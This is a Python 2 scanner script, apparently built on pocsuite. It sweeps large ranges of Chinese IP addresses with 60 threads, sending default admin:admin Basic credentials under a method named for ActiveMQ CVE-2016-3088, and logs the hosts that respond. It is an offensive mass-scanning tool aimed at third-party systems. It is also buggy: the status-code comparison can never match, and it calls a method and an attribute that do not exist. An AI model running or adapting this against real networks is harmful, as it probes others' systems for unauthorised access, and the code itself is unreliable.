#encoding:utf-8

import re
import requests
import sys
import os
import threading
import time
from Queue import Queue
import netaddr

from utils.randomuseragent import randomuseragent
from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
from pocsuite.lib.core.exception import PocsuiteThreadException


class Activemq(object):

    def __init__(self):

        self.in_queue = Queue()
        # for site in open('top_sites.txt', 'r'):
            # self.in_queue.put('http://www.' + site.strip() + ':8161')
        for ip_CIDR in open('china_ip_list.txt', 'r'):
            cidr = int(ip_CIDR.split('/')[1])
            if cidr < 24:
                continue
            ips = netaddr.IPNetwork(ip_CIDR.strip())
            # print len(ips)
            for ip in ips:
                # self.in_queue.put('http://' + str(ip).strip() + ':8161')
                self.in_queue.put('http://' + str(ip).strip() + ':80')

        # print 'totalsite:', self.in_queue.qsize()
        self.total_sites = self.in_queue.qsize()
        self.success_queue = Queue()


    def check_cve_2016_3088(self):
        '''
        affected version:
        Apache ActiveMQ 5.0.0 - 5.13.2
        '''

        # requests = requests.Session()
        while self.in_queue.qsize() > 0:
            url = self.in_queue.get()
            headers = {
                    "Authorization": "Basic YWRtaW46YWRtaW4=",
                    "User-Agent": randomuseragent('useragents.txt')
                    }
            try:
                # print url
                response = requests.get(url, headers=headers, timeout=5)
                # print response.text
                # print url
                # print url, response.status_code
                if response.status_code == '200':
                    print url, response.status_code, 'successfully...'
                    self.success_queue.put(url)
            except Exception, e:
                pass
                # print e
            sys.stdout.write('\r' + ' ' * 80 + str(self.in_queue.qsize()) + ' remain ' + \
                                'total: ' + str(self.total_sites))
            sys.stdout.flush()


    def run(self):

        threads = []
        thread_nums = 60

        try:
            for thread_num in xrange(thread_nums):
                thread = threading.Thread(target=self.check_cve_2016_3088, name=str(thread_num))
                thread.setDaemon(True)
                thread.start()
                threads.append(thread)

            alive = True
            while alive:
                alive = False
                for thread in threads:
                    if thread.isAlive():
                        alive = True
                        time.sleep(0.1)

        except KeyboardInterrupt:
            if self.threads_num > 1:
                logger.log(CUSTOM_LOGGING.SYSINFO, "waiting for threads to finish (Ctrl+C was pressed)")

            try:
                while (threading.activeCount() > 1):
                    pass

            except KeyboardInterrupt:
                raise PocsuiteThreadException("user aborted (Ctrl+C was pressed multiple times)")



def main():

    activemq = Activemq()
    activemq.run()

    print '=' * 20 + ' successfully ' + 20 * '='
    while activemq.success_queue.qsize() > 0:
        print activemq.get()


if __name__ == '__main__':
    os.system('clear')

    main()
